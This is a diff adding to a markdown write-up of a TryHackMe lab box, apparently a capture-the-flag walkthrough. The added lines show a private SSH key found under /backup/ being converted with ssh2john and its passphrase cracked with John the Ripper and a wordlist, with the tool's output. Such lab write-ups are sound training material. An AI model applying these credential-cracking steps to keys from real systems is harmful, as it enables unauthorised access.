@@ -51,3 +51,21 @@ feroxbuster -u http://0day.thm/ -w /usr/share/seclists/Discovery/Web-Content/dir
 
 At url /backup/ we found a private SSH key
 <img width="570" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/f73e3c99-906a-4a4a-8686-8b5fdb7be74e">
+
+```
+$ ssh2john id_rsa >> id_rsa.john
+```
+
+```bash
+$ john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (id_rsa)     
+1g 0:00:00:00 DONE (2023-08-18 16:01) 100.0g/s 51200p/s 51200c/s 51200C/s teiubesc..letmein
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
